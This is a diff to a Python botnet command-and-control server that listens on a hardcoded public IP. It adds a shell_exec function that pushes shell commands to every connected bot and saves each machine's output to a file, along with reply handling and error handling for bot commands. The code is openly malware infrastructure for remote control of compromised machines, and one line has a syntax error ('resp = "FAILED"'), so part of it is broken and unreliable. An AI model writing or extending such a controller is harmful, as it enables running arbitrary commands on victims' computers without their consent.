@@ -34,12 +34,16 @@ def start_server(port=2003,ip="142.93.197.240"):
             pass
 
 def test_conn(bot,addr):
-    bot.send("CHECK".encode())
-    resp = bot.recv(1024).decode()
-    if(resp == "YES"):
-        print("[*] %s : Active"%(addr))
-        global test_bool
-        test_bool = True
+    try:
+        bot.send("CHECK".encode())
+        resp = bot.recv(1024).decode()
+        if(resp == "YES"):
+            print("[*] %s : Active"%(addr))
+            global test_bool
+            test_bool = True
+    except socket.error:
+        test_bool = False
+        pass
 
 def test_bots():
     global botnet
@@ -61,12 +65,35 @@ def detect_os():
         print(bot_os)
         print("\n\n\n\n")
 
+def make_output_file(name,data):
+    file = open(name+'.txt','w')
+    file.write(data)
+    file.close()
+    return
+
+def shell_exec(cmd):
+    global botnet
+    for bot in botnet:
+        botnet[bot].send(cmd.encode())
+        resp = botnet[bot].recv(1024).decode()
+        if(resp == "DONE"):
+            shell_resp = botnet[bot].recv(1024).decode()
+            print("[*] Shell execution successful on %s"%(bot))
+            make_output_file(bot,shell_resp)
+        if(resp == "FAILED"):
+            print("[*] Shell execution failed on %s"%(bot))
+
 def exec_command(cmd):
     global botnet
     print("[*] Sending Command Packets...")
     sleep(1)
     for bot in botnet:
         botnet[bot].send(cmd.encode())
+        resp = botnet[bot].recv(1024).decode()
+        if(resp == "SUCCESS"):
+            print("[*] Command executed on %s"%(bot))
+        elif(resp = "FAILED"):
+            print("[*] Command execution failed on %s"%(bot))
         #cmd_size = len(cmd)
         #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
         #bot.send(packet)
@@ -80,12 +107,18 @@ def process_cmd(cmd):
         for bot in botnet_address:
             print("[*] %d : %s"%(count,str(bot)))
             count += 1
+
     if 'execute' in cmd:
         #cmd = cmd.strip("execute ")
         exec_command(cmd)
         print("[*] Command packets sent!")
+
     if(cmd == "get os"):
         detect_os()
+
+    if "shell" in cmd:
+        shell_exec(cmd)
+
     if 'test' in cmd:
         cmd = cmd.strip("test ")
         t1 = Thread(target=test_bots,args=())
